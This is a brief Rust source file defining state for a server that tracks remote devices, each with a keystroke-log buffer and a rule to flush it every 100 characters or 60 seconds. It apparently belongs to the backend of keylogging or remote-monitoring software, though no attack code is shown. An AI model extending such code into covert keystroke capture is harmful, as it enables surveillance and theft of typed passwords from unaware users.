use crate::db::Db;
use sqlx::Pool;
use std::{collections::HashMap, sync::Arc};
use tokio::sync::RwLock;

#[derive(Debug, Clone, PartialEq)]
pub enum Format {
    Json,
    Csv,
}

#[derive(Debug, Clone)]
pub struct Device {
    pub id: String,
    pub ip: String,
    pub active: bool,
    pub format: Format,
    pub program_id: i32,
    pub caps: Vec<String>,
    pub keylog_buf: String,
    pub keylog_last_flush: std::time::Instant,
}

impl Device {
    pub fn should_flush_keylog(&self) -> bool {
        self.keylog_buf.len() >= 100 || self.keylog_last_flush.elapsed().as_secs() >= 60
    }
}

#[derive(Clone)]
pub struct AppState {
    pub devices: Arc<RwLock<HashMap<String, Device>>>,
    pub db: Pool<Db>,
}
